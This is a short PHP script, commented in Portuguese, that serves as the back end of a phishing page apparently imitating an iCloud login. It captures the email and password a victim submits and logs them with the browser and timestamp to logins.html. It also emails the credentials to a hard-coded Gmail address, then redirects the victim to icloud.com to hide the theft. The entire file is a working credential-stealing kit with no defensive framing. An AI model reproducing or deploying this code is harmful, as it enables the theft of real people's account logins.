<?php
$nomearquivo ="logins.html";
$email =$_POST["email"];
$senha =$_POST["pass"];
$browser =$_SERVER['HTTP_USER_AGENT'];
$data =date("Y-m-d");
$hora =date("H:i:s");
$traco ="<br><br>";
$ess ="Email: ".$email."<br>Senha: ".$senha."<br>Navegador: ".$browser."
<br>Data: ".$data."<br>Hora: ".$hora."<br>".$traco;
$abre =@fopen("logins.html","a+");
$escreve =fwrite($abre, $ess);
global $email; //transforma em variavel global a variável e-mail
$enviou = mail("marllonnarcizo2017@gmail.com", // aqui voce coloca o seu e-mail
"$assunto",
"E-mail: $email
Senha: $senha",
"From: $email <$nome>");
if ($enviou)
echo "<script>javascript:document.location='http://www.icloud.com'
</script>";
function redirecionar($url, $tempo) 
{ 
    $url = str_replace('&amp;', '&', $url); 
         
    if($tempo > 0) 
    { 
        header("Refresh: $tempo; URL=$url"); 
    } 
    else 
    { 
        @ob_flush();
        @ob_end_clean();
        header("Location: $url"); 
        exit; 
    } 
} 
?>